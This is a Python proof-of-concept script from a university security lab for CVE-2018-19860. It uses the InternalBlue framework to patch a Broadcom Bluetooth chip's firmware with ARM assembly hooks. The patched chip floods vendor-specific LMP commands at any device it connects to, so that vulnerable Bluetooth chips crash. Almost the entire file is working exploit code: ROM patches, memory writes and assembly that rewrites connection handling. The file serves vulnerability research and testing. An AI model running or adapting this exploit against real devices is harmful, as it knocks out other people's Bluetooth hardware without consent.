#!/usr/bin/python3

# Jiska Classen, Secure Mobile Networking Lab
# PoC for CVE-2018-19860

import sys

from pwn import *
from internalblue.hcicore import HCICore

"""
This is a crash only test for CVE-2018-19860. Install this patch and connect
to any device. If the target device Bluetooth chip crashes upon connection,
it is vulnerable. If not, it is likely not, but to be sure, adapt the value for
`LMP_VSC_CMD_START` and `LMP_VSC_CMD_END`.

This snippet modifies connection establishment. To be still compatible with
scanning for devices, feature_req and name_req should not be modified.
We modify lm_SendLmpHostConnectionReq, which is only triggered when
clicking on another device to establish a connection. Then we launch the attack
that tries vendor specific LMP commands LMP_VSC_ff ... LMP_VSC_00.

TODO
After ~24 commands, this cannot be repeated any more. Tapping again too early
crashes the driver. Long waiting loops don't help. A good workaround is to 
loop from LMP_VSC_0a to LMP VSC 00, which is enough to see if LMP VSC are 
implemented (LMP_VSC_03 will be replied with LMP_VSC_05) and if the device 
is vulnerable (LMP_VSC_0a will not be answered) or not vulnerable (LMP_VSC_0a 
will be replied with LMP_not_accepted).

"""
HOOK_VSC_EXISTS = 0xABDF6 # This function is in ROM, lm_SendLmpHostConnectionReq
ASM_LOCATION_VSC_EXISTS = 0x00218300
LMP_VSC_CMD_START = 0x0f #0xcf #0x52 # TODO change this depending on fuzz range
LMP_VSC_CMD_END = 0x09 # TODO change this depending on fuzz range
ASM_SNIPPET_VSC_EXISTS = """
b vsc_iterate
b send_lmp

vsc_iterate:
    push {r5-r6, lr}        // backup registers
    mov  r5, 0x%02x00       // 4 byte reverse order LMP, starting with LMP VSC 00 ff
    mov  r6, r0             // backup connection struct
    
    loop:
        mov  r0, r6         // restore connection struct
        bl   send_lmp

        subs r5, 0x00000100 // iterate through VSC LMP commands until VSC 00 00
        cmp  r5, 0x%02x00   // loop exit condition
        bne  loop
    
    
    // proceed as in original function lm_SendLmpHostConnectionReq
    mov  r0, r6             // restore connection struct
    mov  r5, 0x00000066     // LMP_host_connection_req << 1
    bl   send_lmp 
    pop  {r5-r6, lr}        // restore registers
    b    0xABE78            // address from where lm_SendLmpHostConnectionReq was called
    
    

//pass connection struct in r0 and lmp data in r5
send_lmp:
    push {r4-r5,lr}

    mov  r4, r0         // store connection struct copy to r4
    
    // malloc buffer for LMP packet
    bl   0x8691E        // lm_allocLmpBlock

    // fill buffer
    str  r5, [r0, 0xc]  // The actual LMP packet must start at offset 0xC in the buffer.
    //// add some more bytes if needed
    //mov  r1, 0x4242
    //str  r1, [r0, 0xe]
    
    mov  r1, r0         // move lmp packet buffer into r1
    mov  r0, r4         // restore connection struct
    
    pop  {r4-r5,lr}     // restore r4 and the lr
    b    0x3453E        // branch to DHM_LMPTx. DHM_LMPTx will do the return for us.  
    
""" % (LMP_VSC_CMD_START, LMP_VSC_CMD_END)

"""
When sending LMP commands, lookup tables are used to determine length and other
function parameters. However, as we use undefined commands, some of them seem 
never to be sent. The table lookup simply is nonsense here... so we patch around
this.
"""

ASM_LOCATION_LMP_00_LOOKUP = 0x00218200
HOOK_LMP_00_LOOKUP = 0x203dfc  # This function already provides a hook, lm_BPCS_GetLmpInfoTypeFilter
ASM_SNIPPET_LMP_00_LOOKUP = """

    ldr r0, =table
    bx lr

    // dummy table entry
    .align
    table:
    .byte 0x6b  // just a nullsub (bx lr at 0x46a+1)
    .byte 0x04 
    .byte 0x00
    .byte 0x00
    .byte 0x10  // length  
    .byte 0x00    
    .byte 0x00
    .byte 0x01

"""

internalblue = HCICore()
internalblue.interface = internalblue.device_list()[0][1]  # just use the first device

# setup sockets
if not internalblue.connect():
    log.critical("No connection to target device.")
    exit(-1)

progress_log = log.info("Installing assembly patches to crash other device on connect requests...")

# Older devices like the Nexus 5 only accept LMP BPCS from Broadcom,
# they don't know about Cypress yet...
progress_log = log.info("Changing vendor ID from Cypress to Broadcom.")
if not internalblue.writeMem(address=0x2020f0, data='\x0f\x00\x00\x00', progress_log=progress_log):
    progress_log.critical("error!")
    exit(-1)

progress_log = log.info("Writing ASM snippet for LMP BPSC table lookup.")
code = asm(ASM_SNIPPET_LMP_00_LOOKUP, vma=ASM_LOCATION_LMP_00_LOOKUP)
if not internalblue.writeMem(address=ASM_LOCATION_LMP_00_LOOKUP, data=code, progress_log=progress_log):
    progress_log.critical("error!")
    exit(-1)
    
progress_log = log.info("Installing predefined hook for LMP BPSC table lookup.")
if not internalblue.writeMem(address=HOOK_LMP_00_LOOKUP, data=p32(ASM_LOCATION_LMP_00_LOOKUP + 1), progress_log=progress_log):
    progress_log.critical("error!")
    exit(-1)

progress_log = log.info("Writing ASM snippet for LMP BPSC existence check.")
code = asm(ASM_SNIPPET_VSC_EXISTS, vma=ASM_LOCATION_VSC_EXISTS)
if not internalblue.writeMem(address=ASM_LOCATION_VSC_EXISTS, data=code, progress_log=progress_log):
    progress_log.critical("error!")
    exit(-1)

# all send_lmp functions are in rom...
log.info("Installing LMP BPSC existence hook patch...")
patch = asm("b 0x%x" % ASM_LOCATION_VSC_EXISTS, vma=HOOK_VSC_EXISTS)
if not internalblue.patchRom(HOOK_VSC_EXISTS, patch):
    log.critical("error!")
    exit(-1)


log.info("Installed all the hooks. You can now establish connections to other devices to check for the LMP CVE.")

# shutdown connection
internalblue.shutdown()
log.info("------------------")
log.info("To test the vulnerability, establish a classic Bluetooth connection to the target device. Eventually try different values for LMP_VSC_CMD_*.")


